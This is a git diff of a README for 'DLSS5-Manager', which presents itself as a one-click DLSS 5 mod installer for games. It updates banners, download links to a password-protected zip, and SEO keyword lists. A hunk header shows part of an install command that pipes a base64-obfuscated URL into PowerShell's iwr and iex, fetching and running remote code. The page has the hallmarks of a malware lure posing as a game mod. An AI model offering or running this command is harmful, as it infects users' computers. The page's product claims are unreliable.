@@ -1,7 +1,7 @@
-# ⚡ DLSS5-Manager
+# DLSS5-Manager
 
 <p align="center">
-  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Manager" width="140" height="140">
+  <img width="1983" height="793" alt="banner" src="https://github.com/user-attachments/assets/70f30dcc-92a6-4ab9-b5a3-c5cc07092491" />
 </p>
 
 <h1 align="center">DLSS5-Manager</h1>
@@ -9,8 +9,6 @@
   <strong>The Intelligent One-Click Manager for DLSS 5 Neural Rendering</strong><br>
   Swapper · Feeder · OptiScaler · RenoDX · Multipass · ReShade · F8 Overlay
 </p>
-
-<img width="1983" height="793" alt="banner" src="https://github.com/user-attachments/assets/70f30dcc-92a6-4ab9-b5a3-c5cc07092491" />
 
 <p align="center">
   <a href="#"><img src="https://img.shields.io/badge/version-3.0.0-76B900?style=for-the-badge" alt="Version"></a>
@@ -30,7 +28,11 @@
   <a href="#-seo-keywords">🔍 SEO</a>
 </p>
 
-<img width="1536" height="1024" alt="posle-bannera" src="https://github.com/user-attachments/assets/714cdd49-e2e5-4abe-8461-1ed6349abc2f" />
+---
+
+<p align="center">
+  <img width="1536" height="1024" alt="posle-bannera" src="https://github.com/user-attachments/assets/714cdd49-e2e5-4abe-8461-1ed6349abc2f" />
+</p>
 
 ---
 
@@ -42,7 +44,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/040404/DLSS5-Manager.V4.0.zip">
+<a href="https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/050505/DLSS5-Manager.V5.0.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -55,8 +57,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/040404/DLSS5-Manager.V4.0.zip)
-- [Source Code](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/040404/DLSS5-Manager.V4.0.zip)
+- [Latest Release](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/050505/DLSS5-Manager.V5.0.zip)
+- [Source Code](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/050505/DLSS5-Manager.V5.0.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
@@ -139,7 +141,7 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ## 🎯 What is DLSS5-Manager?
 
-**DLSS5-Manager** is the first intelligent manager and one-click mod installer for **DLSS 5 Neural Rendering**. It handles everything — **DLSS5-Swapper**, **DLSS5-Feeder**, **OptiScaler**, **RenoDX**, **ReShade**, and **Multipass** — in one clean, easy-to-use application.
+**DLSS5-Manager** is the intelligent one-click manager for **DLSS 5 Neural Rendering**. It brings together every route — **DLSS5-Swapper**, **DLSS5-Feeder**, **OptiScaler**, **RenoDX**, **ReShade**, and **Multipass** — in one clean, easy-to-use application.
 
 DLSS 5 Neural Rendering debuted with **NBA 2K27** and was officially exclusive to RTX 50-series GPUs. **DLSS5-Manager** brings this technology to older cards through patched binaries, compatibility layers, and synthetic DLAA injection.
 
@@ -156,30 +158,18 @@ The app finds your games across **Steam, Epic, GOG, Xbox Game Pass**, and manual
 <table>
 <tr>
 <td align="center">
-<h3>Library View</h3>
 <img width="1579" height="996" alt="1" src="https://github.com/user-attachments/assets/4370d1e2-9b4a-4340-9fe9-e154a70be623" />
-<br>
-<em>Auto-detected games from Steam, Epic, GOG, Xbox Game Pass</em>
 </td>
 <td align="center">
-<h3>In-Game Overlay</h3>
 <img width="1574" height="999" alt="2" src="https://github.com/user-attachments/assets/fe2e9374-a7a8-40ee-a7db-f151083faca1" />
-<br>
-<em>Press F8 to tune neural rendering live</em>
 </td>
 </tr>
 <tr>
 <td align="center">
-<h3>Installation Routes</h3>
 <img width="1559" height="1009" alt="3" src="https://github.com/user-attachments/assets/cdaa2211-fe1b-4ded-a805-74a63964f2b2" />
-<br>
-<em>Native, Feeder, OptiScaler, RenoDX, or Multipass</em>
 </td>
 <td align="center">
-<h3>Community Page</h3>
 <img width="1536" height="1024" alt="posle-bannera" src="https://github.com/user-attachments/assets/d610b1b2-9da9-46bb-8d26-54637bac2697" />
-<br>
-<em>See what worked for others on your GPU and games</em>
 </td>
 </tr>
 </table>
@@ -273,8 +263,6 @@ The app finds your games across **Steam, Epic, GOG, Xbox Game Pass**, and manual
 
 ## 🎮 DLSS 5 Supported Games (Official + Community)
 
-DLSS 5 Neural Rendering is officially supported in the following titles at launch. Community reports show it also works on many more through DLSS5-Manager's Feeder and OptiScaler routes :
-
 | Game | Official DLSS 5 | Community Tested |
 |------|-----------------|------------------|
 | **NBA 2K27** | ✅ First launch title | ✅ |
@@ -350,7 +338,7 @@ A: A DirectX modding framework built around ReShade's add-on system.
 
 ## 🔍 SEO Keywords & Tags
 
-`dlss`, `dlss 5`, `dlss5`, `dlss5 manager`, `dlss5 swapper`, `dlss5 feeder`, `dlss5 optiscaler`, `dlss5 renodx`, `dlss5 multipass`, `dlss5 reshade`, `nvidia dlss5`, `dlss5 mod`, `dlss5 download`, `dlss unlocked`, `dlss5 対応 ゲーム`, `dlss5-swapper`, `nte dlss5`, `dlss5vklayer`, `how to use dlss5`, `reshade`, `how to install dlss5`, `dlss5 github`, `dlss5 amd`, `dlss5 적용법`, `dlss5 グラボ`, `rhi dlss5`, `dlss5 reshade`, `dlss5 gta`, `renodx dlss5`, `github dlss5`, `dlss5 optiscaler`, `dlss5 reddit`, `dlss5 ps5`, `dlss5 release`, `dlss5 rtx 20`, `dlss5 rtx 30`, `dlss5 rtx 40`, `dlss5 rtx 50`, `dlss5 intel arc`, `dlss5 emulator`, `dlss5 neural rendering`, `dlss5 2026`, `dlss5 guide`, `dlss5 tutorial`, `dlss5 setup`, `dlss5 nba 2k27`, `dlss5 starfield`, `dlss5 hogwarts legacy`, `dlss5 control`, `dlss5 cyberpunk`, `dlss5 skyrim`, `dlss5 gta v`, `dlss5 performance`, `dlss5 fps`, `dlss5 benchmark`, `dlss 5 neural rendering`, `dlss 5 nvidia`, `dlss 5 amd`, `dlss 5 mod`, `dlss 5 download`, `dlss 5 install`, `dlss 5 tool`, `dlss 5 one click`, `dlss 5 swapper`, `dlss 5 feeder`, `dlss 5 reshade`, `dlss 5 optiscaler`, `dlss 5 any gpu`, `dlss 5 emulator`, `dlss 5 game mod`, `dlss 5 neural rendering 2026`, `dlss5 manager github`, `dlss5 manager download`, `dlss5 manager install`, `dlss5 manager guide`, `dlss5 manager reddit`, `dlss5 manager nexus`, `dlss5 manager mod`, `dlss5 manager pc`, `dlss5 manager windows`, `dlss5 manager free`, `dlss5 manager 2026`, `dlss5 manager tool`, `dlss5 manager app`, `dlss5 manager software`, `dlss5 manager utility`, `dlss5 manager installer`, `dlss5 manager one click`, `dlss5 manager easy`, `dlss5 manager fast`, `dlss5 manager safe`, `dlss5 manager backup`, `dlss5 manager restore`, `dlss5 manager overlay`, `dlss5 manager f8`, `dlss5 manager community`, `dlss5 manager library`, `dlss5 manager steam`, `dlss5 manager epic`, `dlss5 manager gog`, `dlss5 manager xbox`, `dlss5 manager emulator`, `dlss5 manager duckstation`, `dlss5 manager pcsx2`, `dlss5 manager rpcs3`, `dlss5 manager xenia`, `dlss5 manager cemu`, `dlss5 manager ryujinx`, `dlss5 manager shadps4`, `dlss5 manager retroarch`, `dlss5 manager directx`, `dlss5 manager vulkan`, `dlss5 manager opengl`, `dlss5 manager directdraw`, `dlss5 manager dgvoodoo`, `dlss5 manager rtx`, `dlss5 manager gpu`, `dlss5 manager performance`, `dlss5 manager fps`, `dlss5 manager comparison`, `dlss5 manager vs swapper`, `dlss5 manager vs universal`, `dlss5 manager powershell`, `dlss5 manager command`, `dlss5 manager iex`, `dlss5 manager install command`, `dlss5 manager zip`, `dlss5 manager archive`, `dlss5 manager password`
+`dlss 5`, `dlss5`, `dlss5 manager`, `dlss 5 swapper`, `dlss5 swapper`, `dlss 5 feeder`, `dlss5 feeder`, `dlss 5 optiscaler`, `dlss5 optiscaler`, `dlss 5 renodx`, `dlss5 renodx`, `dlss 5 mod`, `dlss 5 one click`, `dlss 5 oneclick`, `dlss 5 neural rendering`, `how to use dlss5`, `how to install dlss5`, `dlss5 github`, `dlss5 download`, `dlss5 rtx 50`, `dlss5 rtx 40`, `dlss5 rtx 30`, `dlss5 rtx 20`, `dlss5 amd`, `dlss5 intel arc`, `dlss5 nba 2k27`, `dlss5 starfield`, `dlss5 hogwarts legacy`, `dlss5 control`, `dlss5 cyberpunk`, `dlss5 skyrim`, `dlss5 gta v`, `dlss5 resident evil requiem`, `dlss5 performance`, `dlss5 fps`, `dlss5 benchmark`, `dlss5 guide`, `dlss5 tutorial`, `dlss5 setup`, `dlss5 2026`, `dlss5 patch`, `dlss5 update`, `dlss5 fix`, `dlss5 crash`, `dlss5 not working`, `nvidia dlss 5`, `dlss 5 tool`, `dlss 5 install`, `dlss 5 download`, `dlss 5 game mod`, `dlss5 emulator`, `dlss5 reshade`, `dlss5 directx`, `dlss5 vulkan`, `dlss5 opengl`, `dlss5 duckstation`, `dlss5 pcsx2`, `dlss5 rpcs3`, `dlss5 retroarch`, `dlss5 external`, `dlss5 overlay`, `dlss5 f8 overlay`, `dlss5 backup`, `dlss5 restore`, `dlss5 community`, `dlss5 library`, `dlss5 steam`, `dlss5 epic`, `dlss5 gog`, `dlss5 xbox game pass`
 
 ---
 
@@ -393,736 +381,7 @@ This project is licensed under the **MIT License** — see the [LICENSE](LICENSE
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/DLSS5-Manager">
+  <a href="https://github.com/Fastbrasecret8/DLSS5-Manager">
     <img src="https://img.shields.io/badge/Made%20with%20⚡%20for%20the%20PC%20Gaming%20Community-76B900?style=for-the-badge" alt="Made with passion">
   </a>
 </p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
